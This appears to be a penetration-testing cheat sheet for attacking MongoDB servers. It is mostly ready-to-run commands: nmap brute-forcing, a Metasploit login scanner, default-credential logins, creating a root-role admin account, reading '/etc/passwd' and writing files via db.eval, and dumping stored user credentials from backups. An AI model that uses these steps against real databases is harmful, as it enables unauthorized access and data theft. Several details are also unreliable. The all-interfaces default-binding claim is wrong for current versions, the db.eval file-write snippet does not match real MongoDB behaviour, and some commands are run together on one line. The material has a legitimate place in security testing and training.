# MongoDB

#### 1) Run nmap 

Brute-force attack

    nmap -sV --script mongodb-brute -n -p 27017 <IP>

Enumeration

    nmap -sV --script "mongo* and default" -p 27017 <IP>

#### 2) Metasploit MongoDB Login Scanner

    use auxiliary/scanner/mongodb/mongodb_login
    set RHOSTS <target_ip>
    set RPORT 27017
    run

#### 3) Manual Interaction via PyMongo



    from pymongo import MongoClient
    client = MongoClient('host', 27017, username='username',
    password='password')
    client.server_info() # Retrieve basic server info
    admin = client.admin #If we have admin creds available
    admin_info = admin.command("serverStatus")
    
    # List databases
    cursor = client.list_databases()
    for db in cursor:
    print(db)
    print(client[db["name"]].list_collection_names())

#### 4) MongoDB commands

    show dbs # List databases
    use <db> # Switch to the desired database
    show collections # List collections in the selected database
    db.<collection>.find() # Dump the contents of a collection
    db.<collection>.count() # Get the number of records in the collection
    db.current.find({"username":"admin"}) # Search for a specific user

#### 5) MongoDB Login methods

Basic MongoDB login without specifying a database:

    mongo <HOST>

Specify both host and port:

    mongo <HOST>:<PORT>

Specify a particular database:

    mongo <HOST>:<PORT>/<DB>

Login with a username and password:

    mongo <database> -u <username> -p '<password>'

If no credentials are required, you’ll gain access to the instance. However, if
authentication is enabled, you’ll need valid credentials

#### 6) Manual Inspection

Configuration file: mongo.db

Bitnami MongoDB setup

    /opt/bitnami/mongodb/mongodb.conf

Check if authentication is not required (noauth enabled). If true, then MongoDB is running without authentication.

    grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"

Connect to MongoDB without authentication

    mongo <TARGET_IP>:27017

#### 7) Default Admin Users

Attackers who gain access to a user-level MongoDB account can escalate their privileges by logging in as the admin user if authentication isn’t properly configured.

Identify the Admin Database

    show dbs

Switch to admin database and check if a user exists

    use admin show users

Login with default or weak credentials

    mongo admin -u admin -p 'password' --host <TARGET_IP>:27017

#### 8) Misconfigured Role-Based Access Control (RBAC)

MongoDB uses Role-Based Access Control (RBAC) to define what actions users can perform. Sometimes, roles are misconfigured, allowing users with limited roles to gain access to privileged operations.

Enumerate User Roles 

    db.runCommand({ connectionStatus: 1 })

Misconfigured privileges:

    dbAdmin
    readWrite

Sensitive database: admin

Example: Create a new admin account

    db.createUser({
    user: "newAdmin",
    pwd: "secure_password",
    roles: [ { role: "root", db: "admin" } ]
    })

#### 9) File System Access via MongoDB

MongoDB allows you to store files and binary data using the GridFS system. If the attacker gains dbOwner or dbAdmin privileges, they can exploit MongoDB to read or write files directly to the underlying system.

Privileges: 

    dbOwner
    dbAdmin

Write a file to the system

    db.eval("var file = new File('/path/to/target/file.txt', 'w'); file.write('malicious content'); file.close();")

Read files from the system

    db.eval("var file = cat('/etc/passwd'); print(file);")

#### 10) Insecure Bindings

By default, MongoDB listens on all available network interfaces, which can expose the database to the public internet. If attackers can gain access to an exposed MongoDB API, they may escalate privileges through misconfigured network settings.

Identify the Binding IP (Check if MongoDB is open to the public internet)

    db.adminCommand({getCmdLineOpts: 1}).parsed.net.bindIp

If yes, connect remotely as admin

    mongo <TARGET_IP>:27017/admin -u admin -p 'admin_password'

#### 11) Misconfigured backup systems

MongoDB databases are often backed up regularly. If these backups are exposed to unauthorized users or misconfigured, an attacker can gain access to sensitive data or credentials stored in these backups.

Access backup directories

    mongorestore --host localhost --port 27017 --db admin /path/to/backup

Extract Admin credentials from backup

    use admin
    db.system.users.find()

